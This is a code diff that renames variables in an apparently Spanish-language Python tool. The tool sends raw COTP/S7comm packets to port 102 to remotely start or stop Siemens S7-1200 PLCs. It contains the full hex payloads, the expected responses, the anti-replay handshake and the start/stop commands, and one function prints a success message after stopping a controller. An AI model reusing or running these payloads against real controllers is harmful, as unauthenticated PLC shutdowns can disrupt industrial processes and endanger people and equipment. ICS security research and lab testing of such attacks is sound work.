@@ -44,93 +44,93 @@ def fDeterminarSiIPoFQDN(pHost):
 
 def fEncenderPLC(pHost):
   # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
-  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
   
   # Segundo payload: Solicitud de comunicación S7comm
-  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
   
   # Tercer payload: Anti-replay
-  S7_COMM_ANTI = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
   
-  # Cuarto payload: START7 para encender el PLC
-  START7 = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
+  # Cuarto payload: vPayloadEncender para encender el PLC
+  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
   
   # Respuestas esperadas
-  RESP_COTP_RQ = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
-  RESP_S7_COMM_RQ = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
-  RESP_S7_COMM_ANTI = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
-  RESP_START7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  RESP_vPayloadSolComCOTP = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
+  RESP_vPayloadSolComS7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  RESP_vPayloadAntiReplay = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  RESP_vPayloadEncender = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
   
   try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(5)
     s.connect((pHost, 102))
     
-    # 1. Enviar primer payload: COTP_RQ
-    s.send(bytearray.fromhex(COTP_RQ))
+    # 1. Enviar primer payload: vPayloadSolComCOTP
+    s.send(bytearray.fromhex(vPayloadSolComCOTP))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar COTP_RQ")
+      print("No se recibió respuesta al enviar vPayloadSolComCOTP")
       s.close()
       return
     
     data_hex = data.hex()
-    print(f"Respuesta a COTP_RQ: {data_hex}")
+    print(f"Respuesta a vPayloadSolComCOTP: {data_hex}")
     
     # Verificar que la respuesta sea la esperada
-    if data_hex != RESP_COTP_RQ:
-      print("La respuesta a COTP_RQ no es la esperada. Abortando.")
+    if data_hex != RESP_vPayloadSolComCOTP:
+      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
       s.close()
       return
       
-    # 2. Enviar segundo payload: S7_COMM_RQ
-    s.send(bytearray.fromhex(S7_COMM_RQ))
+    # 2. Enviar segundo payload: vPayloadSolComS7
+    s.send(bytearray.fromhex(vPayloadSolComS7))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar S7_COMM_RQ")
+      print("No se recibió respuesta al enviar vPayloadSolComS7")
       s.close()
       return
     
     data_hex = data.hex()
-    print(f"Respuesta a S7_COMM_RQ: {data_hex}")
+    print(f"Respuesta a vPayloadSolComS7: {data_hex}")
     
     # Verificar que la respuesta sea la esperada
-    if data_hex != RESP_S7_COMM_RQ:
-      print("La respuesta a S7_COMM_RQ no es la esperada. Abortando.")
+    if data_hex != RESP_vPayloadSolComS7:
+      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
       s.close()
       return
     
-    # 3. Enviar tercer payload: S7_COMM_ANTI
-    s.send(bytearray.fromhex(S7_COMM_ANTI))
+    # 3. Enviar tercer payload: vPayloadAntiReplay
+    s.send(bytearray.fromhex(vPayloadAntiReplay))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar S7_COMM_ANTI")
+      print("No se recibió respuesta al enviar vPayloadAntiReplay")
       s.close()
       return
     
     data_hex = data.hex()
-    print(f"Respuesta a S7_COMM_ANTI: {data_hex}")
+    print(f"Respuesta a vPayloadAntiReplay: {data_hex}")
     
     # Verificar que la respuesta sea la esperada
-    if data_hex != RESP_S7_COMM_ANTI:
-      print("La respuesta a S7_COMM_ANTI no es la esperada. Abortando.")
+    if data_hex != RESP_vPayloadAntiReplay:
+      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
       s.close()
       return
     
-    # 4. Enviar cuarto payload: START7
-    s.send(bytearray.fromhex(START7))
+    # 4. Enviar cuarto payload: vPayloadEncender
+    s.send(bytearray.fromhex(vPayloadEncender))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar START7")
+      print("No se recibió respuesta al enviar vPayloadEncender")
       s.close()
       return
     
     data_hex = data.hex()
-    print(f"Respuesta a START7: {data_hex}")
+    print(f"Respuesta a vPayloadEncender: {data_hex}")
     
     # Verificar que la respuesta sea la esperada
-    if data_hex != RESP_START7:
-      print("La respuesta a START7 no es la esperada. Abortando.")
+    if data_hex != RESP_vPayloadEncender:
+      print("La respuesta a vPayloadEncender no es la esperada. Abortando.")
       s.close()
       return
       
@@ -145,57 +145,57 @@ def fEncenderPLC(pHost):
 
 def fApagarPLC(pHost):
   # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
-  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
   
   # Segundo payload: Solicitud de comunicación S7comm
-  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
   
   # Tercer payload: Anti-replay
-  S7_COMM_ANTI = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
   
-  # Cuarto payload: STOP7 para apagar el PLC
-  STOP7 = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+  # Cuarto payload: vPayloadApagar para apagar el PLC
+  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
   
   try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(5)
     s.connect((pHost, 102))
     
-    # 1. Enviar primer payload: COTP_RQ
-    s.send(bytearray.fromhex(COTP_RQ))
+    # 1. Enviar primer payload: vPayloadSolComCOTP
+    s.send(bytearray.fromhex(vPayloadSolComCOTP))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar COTP_RQ")
+      print("No se recibió respuesta al enviar vPayloadSolComCOTP")
       s.close()
       return
-    print(f"Respuesta a COTP_RQ: {data.hex()}")
+    print(f"Respuesta a vPayloadSolComCOTP: {data.hex()}")
       
-    # 2. Enviar segundo payload: S7_COMM_RQ
-    s.send(bytearray.fromhex(S7_COMM_RQ))
+    # 2. Enviar segundo payload: vPayloadSolComS7
+    s.send(bytearray.fromhex(vPayloadSolComS7))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar S7_COMM_RQ")
+      print("No se recibió respuesta al enviar vPayloadSolComS7")
       s.close()
       return
-    print(f"Respuesta a S7_COMM_RQ: {data.hex()}")
+    print(f"Respuesta a vPayloadSolComS7: {data.hex()}")
     
-    # 3. Enviar tercer payload: S7_COMM_ANTI
-    s.send(bytearray.fromhex(S7_COMM_ANTI))
+    # 3. Enviar tercer payload: vPayloadAntiReplay
+    s.send(bytearray.fromhex(vPayloadAntiReplay))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar S7_COMM_ANTI")
+      print("No se recibió respuesta al enviar vPayloadAntiReplay")
       s.close()
       return
-    print(f"Respuesta a S7_COMM_ANTI: {data.hex()}")
+    print(f"Respuesta a vPayloadAntiReplay: {data.hex()}")
     
-    # 4. Enviar cuarto payload: STOP7
-    s.send(bytearray.fromhex(STOP7))
+    # 4. Enviar cuarto payload: vPayloadApagar
+    s.send(bytearray.fromhex(vPayloadApagar))
     data = s.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar STOP7")
+      print("No se recibió respuesta al enviar vPayloadApagar")
       s.close()
       return
-    print(f"Respuesta a STOP7: {data.hex()}")
+    print(f"Respuesta a vPayloadApagar: {data.hex()}")
       
     print("Stopping the PLC... Well Done!")
   except socket.timeout:
@@ -252,8 +252,8 @@ def fEnviarPayload(pData, pSocket):
 def fCalcularAntiReplay(pData):
   """ Extrae el challenge y calcula el valor anti-replay. """
   vChallenge = pData.hex()[48:50]  # Extrae el byte del challenge
-  vAntiReplay = int(vChallenge, 16) + 0x80  # Suma 0x80
-  return vAntiReplay
+  vPayloadAntiReplay = int(vChallenge, 16) + 0x80  # Suma 0x80
+  return vPayloadAntiReplay
 
 
 def fModificarPayload(pPayload, pAntiReplay):
